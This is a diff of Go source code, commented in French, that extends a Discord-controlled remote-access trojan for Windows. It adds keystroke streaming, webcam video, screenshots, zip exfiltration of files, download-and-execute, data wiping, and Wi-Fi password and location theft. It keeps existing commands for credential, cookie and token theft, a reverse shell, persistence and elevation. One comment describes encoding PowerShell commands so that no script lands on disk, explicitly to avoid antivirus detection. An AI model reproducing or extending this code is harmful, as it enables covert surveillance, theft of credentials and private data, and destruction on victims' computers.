@@ -29,6 +29,7 @@ import (
 	"strings"
 	"syscall"
 	"time"
+	"unicode/utf16"
 )
 
 const (
@@ -40,7 +41,8 @@ const (
 
 var c2Seen = map[string]bool{}
 var c2FirstPoll = true
-var c2Channel string // salon réellement interrogé (un par machine)
+var c2Channel string     // salon réellement interrogé (un par machine)
+var keylogEnabled = true // flux 5s vers salon keylogs (toggle avec !keylog on/off)
 
 /* ------------------------------------------------------------------ */
 /* Appels API Discord                                                 */
@@ -98,6 +100,25 @@ func discordSendBody(method, path string, payload any) ([]byte, int, error) {
 	defer resp.Body.Close()
 	b, _ := io.ReadAll(io.LimitReader(resp.Body, 4*1024*1024))
 	return b, resp.StatusCode, nil
+}
+
+// discordRequest fabrique une requête authentifiée sans corps JSON : utilisé
+// par les appels de réactions (PUT/DELETE) qui n'envoient rien.
+func discordRequest(method, path string, body io.Reader) (*http.Request, error) {
+	req, err := http.NewRequest(method, discordAPI+path, body)
+	if err != nil {
+		return nil, err
+	}
+	req.Header.Set("Authorization", "Bot "+cfg.BotToken)
+	req.Header.Set("User-Agent", discordUA)
+	return req, nil
+}
+
+// ioCopyDiscard vide et referme un corps de réponse : indispensable pour que
+// la connexion HTTP soit réutilisée (sinon fuite de sockets à chaque réaction).
+func ioCopyDiscard(resp *http.Response) (int64, error) {
+	defer resp.Body.Close()
+	return io.Copy(io.Discard, resp.Body)
 }
 
 // discordReply envoie un message dans le canal de commande.
@@ -289,24 +310,24 @@ func c2Execute(command string) {
 			discordReply("usage : !shell <commande>")
 			return
 		}
-		out, err := runCmdLine(args)
+		out, err := runCmdUTF8(args)
 		if err != nil && out == "" {
 			discordReply("erreur : " + err.Error())
 			return
 		}
-		discordReply("```\n" + out + "\n```")
+		deliverOutput("cmd · "+args, out)
 
 	case "shell_ps", "ps", "psh", "powershell":
 		if args == "" {
 			discordReply("usage : !shell_ps <commande PowerShell>\nex. !shell_ps Get-Process | Select-Object -First 5")
 			return
 		}
-		out, err := runCmdLinePS(args)
+		out, err := runPSUTF8(args)
 		if err != nil && out == "" {
 			discordReply("erreur : " + err.Error())
 			return
 		}
-		discordReply("```\n" + out + "\n```")
+		deliverOutput("powershell · "+args, out)
 
 	case "pwd":
 		wd, _ := os.Getwd()
@@ -322,35 +343,6 @@ func c2Execute(command string) {
 	case "cat", "type":
 		discordReply(readTextFile(args))
 
-	case "download", "get":
-		discordReply(downloadFile(args))
-
-	case "upload":
-		// Renvoie le contenu d'un fichier local vers le canal.
-		discordReply(downloadFile(args))
-
-	case "screenshot", "shot", "cap":
-		screenshotFlush()
-		shots := shotList()
-		if len(shots) == 0 {
-			discordReply("capture impossible.")
-			return
-		}
-		var files []fileOut
-		for i, p := range shots {
-			if i >= 3 {
-				break
-			}
-			if b, err := os.ReadFile(p); err == nil {
-				files = append(files, fileOut{Name: filepath.Base(p), Data: b})
-			}
-		}
-		discordReply("captures :")
-		discordUploadToChannel(files...)
-		for _, p := range shots {
-			_ = os.Remove(p)
-		}
-
 	case "steal", "exfil":
 		stealAll(true)
 		discordReply("exfiltration terminée.")
@@ -363,15 +355,164 @@ func c2Execute(command string) {
 		}
 		discordReply("photo envoyée dans <#" + webcamChannel() + ">.")
 
+	case "webcamrec", "camrec":
+		if args == "" {
+			discordReply("usage : !webcamrec <secondes 1-300>")
+			return
+		}
+		sec, _ := strconv.Atoi(strings.TrimSpace(args))
+		discordReply(webcamRecord(sec))
+
+	case "screenshot", "shot", "cap":
+		parts := strings.Fields(args)
+		if len(parts) > 0 {
+			switch strings.ToLower(parts[0]) {
+			case "hd", "max":
+				setShotScale(3)
+				discordReply("captures en haute définition (x3). `!screenshot scale 1` pour revenir au natif.")
+				return
+			case "scale":
+				if len(parts) > 1 {
+					if n, err := atoi(parts[1]); err == nil {
+						setShotScale(n)
+						discordReply(fmt.Sprintf("échelle des captures : x%d.", shotScaleValue()))
+					}
+				}
+				return
+			}
+			if n, err := atoi(parts[0]); err == nil && n > 0 {
+				monitor := 0
+				count := 10
+				if len(parts) > 1 {
+					monitor, _ = atoi(parts[1])
+				}
+				if len(parts) > 2 {
+					count, _ = atoi(parts[2])
+				}
+				discordReply(scheduledScreenshots(n, monitor, count))
+				return
+			}
+		}
+		where, n := sendShots("commande", shotsNow())
+		if n == 0 {
+			discordReply("capture impossible.")
+			return
+		}
+		discordReply(fmt.Sprintf("%d capture(s) envoyée(s) dans %s (x%d).", n, where, shotScaleValue()))
+
+	case "search", "find":
+		parts := strings.Fields(args)
+		pattern := ""
+		maxRes := 50
+		if len(parts) > 0 {
+			pattern = parts[0]
+		}
+		if len(parts) > 1 {
+			maxRes, _ = strconv.Atoi(parts[1])
+		}
+		discordReply(searchFiles(pattern, maxRes))
+
+	case "download", "get":
+		if args == "" {
+			discordReply("usage : !download <fichier|dossier>")
+			return
+		}
+		discordReply(zipAndUpload(args))
+
+	case "upload":
+		parts := strings.Fields(args)
+		if len(parts) < 2 {
+			discordReply("usage : !upload <url> <destination>")
+			return
+		}
+		discordReply(uploadFromURL(parts[0], parts[1]))
+
+	case "exec", "run":
+		parts := strings.Fields(args)
+		if len(parts) == 0 {
+			discordReply("usage : !exec <fichier> [args]")
+			return
+		}
+		path := parts[0]
+		argsRest := ""
+		if len(parts) > 1 {
+			argsRest = strings.Join(parts[1:], " ")
+		}
+		discordReply(execFile(path, argsRest))
+
+	case "rm", "suppr":
+		discordReply(deletePath(args))
+
+	case "delete", "wipe":
+		discordReply(wipeAll(args))
+
+	case "apps", "ps-list", "processus":
+		discordReply(listApps(args))
+
+	case "open":
+		discordReply(openTarget(args))
+
+	case "close":
+		discordReply(closeWindow(args))
+
+	case "kill", "taskkill":
+		discordReply(killTarget(args))
+
+	case "prank", "blague":
+		parts := strings.SplitN(args, " ", 2)
+		kind := ""
+		rest := ""
+		if len(parts) > 0 {
+			kind = parts[0]
+		}
+		if len(parts) > 1 {
+			rest = parts[1]
+		}
+		discordReply(prankRun(kind, rest))
+
+	case "menu", "boutons":
+		id := postStatus(true)
+		if id == "" {
+			discordReply("menu indisponible (jeton bot ou salon manquant).")
+			return
+		}
+		discordReply("bandeau d'état republié : réagis avec 🖥️ 📷 🔑 ℹ️ 📁 ⛔.")
+
+	case "shutdown", "off":
+		restart := strings.Contains(strings.ToLower(args), "r") || strings.Contains(strings.ToLower(args), "restart")
+		timeout := 30
+		for _, f := range strings.Fields(args) {
+			if n, err := strconv.Atoi(f); err == nil {
+				timeout = n
+				break
+			}
+		}
+		discordReply(shutdownPC(restart, timeout))
+
+	case "wifi":
+		discordReply(wifiReport())
+
+	case "location", "loc", "geo":
+		discordReply(locationReport())
+
 	case "keylog", "kl":
+		fields2 := strings.Fields(args)
+		if len(fields2) >= 1 && strings.ToLower(fields2[0]) == "off" {
+			keylogEnabled = false
+			discordReply("keylog flux désactivé.")
+			return
+		}
+		if len(fields2) >= 1 && strings.ToLower(fields2[0]) == "on" {
+			keylogEnabled = true
+			discordReply("keylog flux activé.")
+			return
+		}
 		keylogFlush()
 		data := readFileOr(workPath("kl.log"), nil)
 		if len(data) == 0 {
 			discordReply("kl.log vide.")
 			return
 		}
-		// Le journal continu vit dans le salon des keylogs : on y renvoie
-		// quand il est distinct, sinon le fichier part dans ce salon.
 		ch := keylogChannel()
 		if ch != "" && ch != targetChannel() {
 			sendFilesTo(ch, fileOut{Name: "kl.log", Data: data})
@@ -380,6 +521,21 @@ func c2Execute(command string) {
 			return
 		}
 		discordUploadToChannel(fileOut{Name: "kl.log", Data: data})
+
+	case "deleteall", "efface":
+		discordReply(wipeAll(args))
+
+	case "status":
+		priv := "standard"
+		if isElevated() {
+			priv = "admin"
+		}
+		ws := "actif"
+		if stopped.Load() {
+			ws = "arrêté"
+		}
+		discordReply(fmt.Sprintf("**Status**\nPayload : %s\nPrivilèges : %s\nPersistance : %s\nKeylog : %v\nCaptures : x%d\nDernier salon : <#%s>\nBot : %s",
+			ws, priv, persistStatus(), keylogEnabled, shotScaleValue(), targetChannel(), botIDFromToken()))
 
 	case "licence", "license", "cle":
 		lic := strings.TrimSpace(licenceReport())
@@ -444,12 +600,13 @@ func c2Execute(command string) {
 			" — connecte-toi, la sortie sera sous peu disponible.")
 		go func() { _ = shellOnce(fields2[0], fields2[1], kind) }()
 
-	case "stop", "exit", "kill":
+	case "stop", "exit":
 		cfg.Enabled = false
 		stopped.Store(true)
+		postStatus(false)
 		discordReply("payload arrêté : extraction, journal, captures et envois " +
 			"s'arrêtent. La persistance reste en place — tape `!persist off` " +
-			"pour la retirer. Relance l'application pour redémarrer.")
+			"ou `!delete confirm` pour tout retirer. Relance l'application pour redémarrer.")
 
 	default:
 		// Tout le reste est traité comme une commande shell.
@@ -464,22 +621,42 @@ func c2Execute(command string) {
 
 func c2Help() string {
 	return "```\n" +
-		"!shell <cmd>       commande cmd.exe\n" +
-		"!shell_ps <cmd>    commande PowerShell\n" +
-		"!ls [chemin]       liste un dossier\n" +
-		"!cat <fichier>     affiche un texte\n" +
-		"!download <fichier> envoie un fichier\n" +
-		"!screenshot        captures d'écran (un fichier par écran)\n" +
-		"!webcam            photo webcam dans <machine>-webcam\n" +
-		"!steal             identifiants, cookies, jetons, licences\n" +
-		"!keylog            journal du clavier (salon keylogs)\n" +
-		"!clip              presse-papiers\n" +
-		"!sysinfo           état de la machine\n" +
-		"!licence           clés d'activation Windows\n" +
-		"!elevate <cmd>    commande PowerShell en admin (invite UAC)\n" +
-		"!persist on|off    démarrage avec Windows\n" +
-		"!shell_tcp <h> <p> [cmd|ps]  reverse shell TCP\n" +
-		"!stop              arrête le payload\n" +
+		"!shell <cmd>         cmd.exe, sortie complète (.txt si longue)\n" +
+		"!ps <cmd>            PowerShell, sortie complète\n" +
+		"!ls [chemin]         liste un dossier\n" +
+		"!cat <fichier>       affiche un texte\n" +
+		"!download <cible>    envoie fichier/dossier (zip auto)\n" +
+		"!upload <url> <dest> télécharge depuis une URL\n" +
+		"!exec <fichier> [a]  exécute un fichier local\n" +
+		"!open <cible>        ouvre fichier/dossier/url\n" +
+		"!close <pid|nom>     ferme la fenêtre\n" +
+		"!kill <pid|nom>      tue le processus\n" +
+		"!apps [filtre]       applications + chemins\n" +
+		"!rm <chemin>         supprime fichier/dossier\n" +
+		"!screenshot          captures (salon -screenshots)\n" +
+		"!screenshot hd       agrandit x3 (scale 1|2|3)\n" +
+		"!screenshot <s> [m] [n]  captures programmées\n" +
+		"!webcam              photo webcam\n" +
+		"!webcamrec <s>       vidéo webcam (1-300 s)\n" +
+		"!steal               identifiants, cookies, jetons\n" +
+		"!keylog              journal complet\n" +
+		"!keylog on|off       flux 5 s dans le salon keylogs\n" +
+		"!clip                presse-papiers\n" +
+		"!sysinfo             état de la machine\n" +
+		"!wifi                mots de passe WiFi\n" +
+		"!location            géolocalisation + adresse\n" +
+		"!search <motif> [n]  recherche fichiers\n" +
+		"!licence             clés d'activation Windows\n" +
+		"!elevate <cmd>       PowerShell en admin (UAC)\n" +
+		"!persist on|off      démarrage avec Windows\n" +
+		"!prank <effet> [a]   msg, wall, url, speak, beep, cd,\n" +
+		"                     rotate, taskbar, volume, lock, swapmouse\n" +
+		"!shell_tcp <h> <p>   reverse shell TCP\n" +
+		"!shutdown [r] [ts]   éteint (r=redémarre)\n" +
+		"!status              état payload, privilèges, persistance\n" +
+		"!menu                republie le bandeau à réactions\n" +
+		"!stop                arrête le payload (persistance intacte)\n" +
+		"!delete confirm      SUPPRESSION TOTALE (tout retirer)\n" +
 		"```"
 }
 
@@ -502,26 +679,27 @@ func runCmdLinePS(command string) (string, error) {
 // qPS enchâsse un chemin pour un script PowerShell (guillemets simples).
 func qPS(s string) string { return "'" + strings.ReplaceAll(s, "'", "''") + "'" }
 
-// runElevatedCommand exécute une commande PowerShell en administrateur :
-// script temporaire, lancement ShellExecute « runas » (invite UAC affichée
-// sur la machine - aucune élévation silencieuse possible), puis lecture du
-// fichier de sortie.
-func runElevatedCommand(psCommand string) (string, error) {
-	base := workPath(fmt.Sprintf("u%d", time.Now().UnixNano()))
-	script := base + ".ps1"
-	out := base + ".out"
-	body := "$ErrorActionPreference='Continue'\r\n& {\r\n" + psCommand + "\r\n} *> " + qPS(out) + "\r\n"
-	// UTF-8 avec BOM : Windows PowerShell 5.1 lit un .ps1 sans BOM en ANSI,
-	// ce qui corrompt les chemins accentués (utilisateur « caméléon »).
-	if err := os.WriteFile(script, []byte("\xef\xbb\xbf"+body), 0600); err != nil {
-		return "", err
+// psEncoded encode un script PowerShell en base64 de UTF-16LE : la forme
+// attendue par -EncodedCommand. Le script ne transite jamais par un fichier
+// .ps1 sur disque — un fichier script était scanné statiquement et finissait
+// en détection (c'est ce qui a fait tomber sysupdate.vbs).
+func psEncoded(script string) string {
+	u := utf16.Encode([]rune(script))
+	b := make([]byte, 0, len(u)*2)
+	for _, r := range u {
+		b = append(b, byte(r), byte(r>>8))
 	}
-	defer os.Remove(script)
+	return base64.StdEncoding.EncodeToString(b)
+}
 
-	// Le parseur natif de powershell.exe ne connaît que les guillemets
-	// doubles : un chemin livré entre apostrophes reste entouré
-	// d'apostrophes et -File échoue.
-	args := "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File \"" + script + "\""
+// runElevatedCommand exécute une commande PowerShell en administrateur :
+// corps encodé en ligne de commande (aucun script sur disque), lancement
+// ShellExecute « runas » (invite UAC affichée sur la machine — aucune
+// élévation silencieuse possible), puis lecture du fichier de sortie.
+func runElevatedCommand(psCommand string) (string, error) {
+	out := workPath(fmt.Sprintf("u%d.out", time.Now().UnixNano()))
+	body := "$ErrorActionPreference='Continue'\r\n& {\r\n" + psCommand + "\r\n} *> " + qPS(out) + "\r\n"
+	args := "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand " + psEncoded(body)
 	if err := runElevated("powershell.exe", args); err != nil {
 		return "", err
 	}
